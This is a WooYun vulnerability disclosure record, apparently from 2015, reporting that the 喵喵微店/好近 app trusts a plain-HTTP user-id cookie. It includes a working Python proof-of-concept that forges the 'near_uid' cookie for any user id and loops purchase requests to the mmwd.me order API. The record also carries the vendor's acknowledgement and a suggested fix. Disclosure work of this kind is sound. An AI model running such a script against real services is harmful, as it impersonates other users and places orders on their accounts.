{"id": 79904, "wybug_id": "wooyun-2015-0157072", "wybug_title": "好近/钱方/喵喵微店app存在用户权限验证不严格", "wybug_corp": "北京钱方互动科技有限公司", "wybug_author": "一剑祝福", "wybug_date": "2015-12-01 12:08", "wybug_open_date": "2016-01-15 15:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "安全意识不足", "未授权访问", "用户敏感信息泄露", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向公众公开  简要描述： 某app存在用户验证不严格，使用普通的http通讯，截获u_id之后可以进行任意操作。id可以读到任意数据，包括商品购买地址之类的或购买任意商品，存在秒杀脚本的情况。 详细说明：  一个python脚本说明问题:\nimport cookielib,urllib2,jsondef make_cookie(name, value):    return cookielib.Cookie(                            version=0,                            name=name,                            value=value,                            port=None,                            port_specified=False,                            domain=\"mmwd.me\",                            domain_specified=True,                            domain_initial_dot=False,                            path=\"/\",                            path_specified=True,                            secure=False,                            expires=None,                            discard=False,                            comment=None,                            comment_url=None,                            rest=None                            )getSessionURL = \"http://mmwd.me/api/qtpay_token\"buyURL = \"http://mmwd.me/api/order/activity_buy\"cookieJar=cookielib.CookieJar()def sendMsg(url,jsonData):    postData = json.dumps(jsonData)    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))       req = None;    if(jsonData is None):        req = urllib2.Request(url)    else:        req = urllib2.Request(url,postData)    req.add_header('Content-Type', 'application/json; charset=utf-8');    req.add_header('Host', 'mmwd.me');    req.add_header('Connection', 'keep-alive');    req.add_header('User-Agent', 'QMMWD/0.8.9 iPhone/8.3 AFNetwork/1.1');    req.add_header('Accept-Language','zh-Hans;q=1');    req.add_header('Accept-Encoding','gzip, deflate');    req.add_header('Connection','keep-alive')#    print \"josnData %s\"%(opener.addheaders)    f = opener.open(req);        content = f.read();    decodejson = json.loads(content)    print \"%s\"%(decodejson[\"resperr\"]);    if decodejson[\"respcd\"] == '0000':        print '抢购成功';        return True;    if decodejson[\"respmsg\"] == '商品库存不足':        print '没有库存了~~~'        return True;    return False;#    print \"content \\n%s\"%(content)#    print \"cookie %s\\n\"%(cookieJar)if __name__==\"__main__\":        u_id = raw_input(\"请输入用户id:\");    addr_id = raw_input(\"请输入地址id:\");    item_id = raw_input(\"请输入要抢购商品的id:\");        data={\"amount\":\"1\",\"activity_id\":item_id,\"addr_id\":addr_id,\"remark\":\"\"}    cookieJar.set_cookie(make_cookie(\"near_uid\", u_id))    tmp = raw_input(\"按任意键开始抢购\");    sendMsg(getSessionURL,None);        isCompleted = False;    while isCompleted == False:        isCompleted = sendMsg(buyURL,data)\n   漏洞证明：     修复方案：  建议重新通过 向cookie 写入session token验证数据。完善用户验证机制   版权声明：转载请注明来源 一剑祝福@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-12-01 15:13 厂商回复： 谢谢提醒。我们会尽快增加验证机制，保证用户信息安全，让大家更放心的体验各种好近福利。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}